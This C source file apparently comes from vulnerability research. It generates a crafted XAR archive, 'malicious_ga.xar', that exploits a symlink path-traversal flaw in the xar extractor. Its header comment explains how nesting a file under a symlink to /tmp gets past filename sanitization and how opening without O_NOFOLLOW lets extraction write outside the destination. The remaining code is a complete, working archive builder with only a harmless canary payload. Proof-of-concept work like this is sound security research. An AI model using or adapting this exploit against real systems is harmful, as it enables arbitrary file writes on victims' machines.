/*
 * build_xar_r32.c  — malicious NESTED XAR, no file-data checksums
 *
 * Root cause of flat-XAR failure (runs 27-31):
 *   xar_is_safe_filename() in util.c sanitizes '/' → ':' for each <name> element.
 *   fspath is assembled at parse time from sanitized components (filetree.c:1438).
 *   So a flat entry named "link_to_tmp/xar_gated_canary_macos.txt" gets fspath
 *   "link_to_tmp:xar_gated_canary_macos.txt" — symlink traversal never happens.
 *
 * Fix: NESTED structure.
 *   id=1  SYMLINK  <name>link_to_tmp</name>  <link>/tmp</link>
 *     id=2  FILE  <name>xar_gated_canary_macos.txt</name>  (child of id=1)
 *
 * Why this bypasses sanitization:
 *   - Neither name contains '/' → xar_is_safe_filename passes both unchanged.
 *   - xar_get_safe_path(id=2) assembles: "link_to_tmp/xar_gated_canary_macos.txt"
 *     from sanitized parent ("link_to_tmp") + sanitized child ("xar_gated_canary_macos.txt").
 *   - xar_extract_tofile is called with "link_to_tmp/xar_gated_canary_macos.txt".
 *   - stat.c CREATEFILE: open("link_to_tmp/...", O_RDWR|O_CREAT|O_TRUNC, 0600)
 *     — no O_NOFOLLOW → OS follows link_to_tmp → /tmp → writes /tmp/xar_gated_canary_macos.txt
 *
 * Iterator order for nested structure:
 *   xar_file_first → id=1 (only top-level entry, symlink created first)
 *   xar_file_next  → id=2 (child of id=1, file extracted through symlink)
 *
 * Heap: [0..19]=SHA1(tocz)  [20..]=compressed payload
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

#define XAR_MAGIC      0x78617221
#define XAR_CKSUM_SHA1 1

static void compress_buf(const unsigned char *in, size_t inlen,
                         unsigned char **out, size_t *outlen) {
    *outlen = compressBound(inlen) + 64;
    *out = malloc(*outlen);
    z_stream s = {0};
    deflateInit2(&s, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15, 8, Z_DEFAULT_STRATEGY);
    s.next_in  = (Bytef*)in;  s.avail_in  = (uInt)inlen;
    s.next_out = *out;        s.avail_out = (uInt)*outlen;
    deflate(&s, Z_FINISH);
    deflateEnd(&s);
    *outlen = s.total_out;
}

int main(void) {
    const char *payload_str = "XAR_SYMLINK2_GATE_A_NESTED_RUN32\n";
    const unsigned char *payload = (const unsigned char *)payload_str;
    size_t payload_len = strlen(payload_str);

    unsigned char *cz = NULL;
    size_t czlen = 0;
    compress_buf(payload, payload_len, &cz, &czlen);

    char toc_xml[4096];
    int tlen = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
          "<checksum style=\"sha1\">"
            "<offset>0</offset><size>20</size>"
          "</checksum>"
          "<file id=\"1\">"
            "<name>link_to_tmp</name>"
            "<type>symlink</type>"
            "<link>/tmp</link>"
            "<file id=\"2\">"
              "<name>xar_gated_canary_macos.txt</name>"
              "<type>file</type>"
              "<data>"
                "<offset>20</offset>"
                "<size>%zu</size>"
                "<length>%zu</length>"
                "<encoding style=\"application/x-gzip\"/>"
              "</data>"
            "</file>"
          "</file>"
        "</toc></xar>",
        payload_len, czlen);

    if (tlen <= 0 || (size_t)tlen >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC too large\n"); return 1;
    }
    size_t toc_xml_len = (size_t)tlen;

    unsigned char *tocz = NULL;
    size_t toczlen = 0;
    compress_buf((const unsigned char *)toc_xml, toc_xml_len, &tocz, &toczlen);

    unsigned char sha1_hash[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(tocz, (CC_LONG)toczlen, sha1_hash);

    uint8_t hdr[28];
    {
        uint32_t magic    = htonl(XAR_MAGIC);
        uint16_t hdrsize  = htons(28);
        uint16_t version  = htons(1);
        uint32_t cktype   = htonl(XAR_CKSUM_SHA1);
        uint64_t toc_clen = __builtin_bswap64((uint64_t)toczlen);
        uint64_t toc_ulen = __builtin_bswap64((uint64_t)toc_xml_len);
        memcpy(hdr+ 0, &magic,   4);
        memcpy(hdr+ 4, &hdrsize, 2);
        memcpy(hdr+ 6, &version, 2);
        memcpy(hdr+ 8, &toc_clen,8);
        memcpy(hdr+16, &toc_ulen,8);
        memcpy(hdr+24, &cktype,  4);
    }

    FILE *f = fopen("malicious_ga.xar", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(hdr,       1, 28,      f);
    fwrite(tocz,      1, toczlen, f);
    fwrite(sha1_hash, 1, 20,      f);
    fwrite(cz,        1, czlen,   f);
    fclose(f);

    printf("[+] malicious_ga.xar written\n");
    free(cz); free(tocz);
    return 0;
}
